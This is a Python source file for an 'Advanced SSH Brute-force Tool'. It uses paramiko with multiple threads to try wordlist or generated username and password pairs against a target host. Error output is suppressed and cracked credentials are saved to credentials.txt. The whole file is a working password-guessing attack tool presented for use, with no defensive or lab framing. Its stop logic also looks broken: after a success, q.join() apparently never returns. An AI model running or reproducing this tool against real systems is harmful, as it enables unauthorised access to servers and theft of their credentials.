# advance_ssh_brute.py - Advanced SSH Brute-force Tool
import paramiko
import argparse
import socket
import time
import threading
import queue
import itertools
import contextlib
import sys
import os
from colorama import init, Fore

init()

@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr

def is_ssh_open(host, username, password, timeout=5, retries=2):
    for attempt in range(retries + 1):
        with suppress_stderr():
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(hostname=host, username=username, password=password, timeout=timeout)
                client.close()
                return True
            except paramiko.AuthenticationException:
                return False
            except (socket.error, paramiko.SSHException):
                time.sleep(2)
    return False

def load_lines(path):
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def generate_passwords(base, length=4):
    for comb in itertools.product(base, repeat=length):
        yield ''.join(comb)

def worker(host, q, stop_flag):
    while not q.empty() and not stop_flag.is_set():
        try:
            username, password = q.get_nowait()
        except queue.Empty:
            break
        if is_ssh_open(host, username, password):
            print(f"{Fore.GREEN}[+] Success: {username}:{password}{Fore.RESET}")
            with open("credentials.txt", "a") as f:
                f.write(f"{username}@{host}:{password}\n")
            stop_flag.set()
        else:
            print(f"{Fore.RED}[-] Failed: {username}:{password}{Fore.RESET}")
        q.task_done()

def main():
    parser = argparse.ArgumentParser(description="Advanced SSH Brute-force Tool")
    parser.add_argument("--host", required=True, help="Target host")
    parser.add_argument("--userlist", help="Username list file")
    parser.add_argument("--passlist", help="Password list file")
    parser.add_argument("--genpass", action="store_true", help="Enable password generation")
    parser.add_argument("--charset", default="abc123", help="Charset for password generation")
    parser.add_argument("--length", type=int, default=4, help="Length of passwords to generate")
    parser.add_argument("--threads", type=int, default=4, help="Number of worker threads")
    args = parser.parse_args()

    usernames = load_lines(args.userlist) if args.userlist else ["root"]
    if args.genpass:
        passwords = list(generate_passwords(args.charset, args.length))
    else:
        passwords = load_lines(args.passlist) if args.passlist else []

    q = queue.Queue()
    for user in usernames:
        for pwd in passwords:
            q.put((user, pwd))

    stop_flag = threading.Event()
    threads = [threading.Thread(target=worker, args=(args.host, q, stop_flag), daemon=True) for _ in range(args.threads)]

    for t in threads:
        t.start()
    q.join()

    if not stop_flag.is_set():
        print(f"{Fore.YELLOW}[!] No valid credentials found.{Fore.RESET}")

if __name__ == "__main__":
    main()
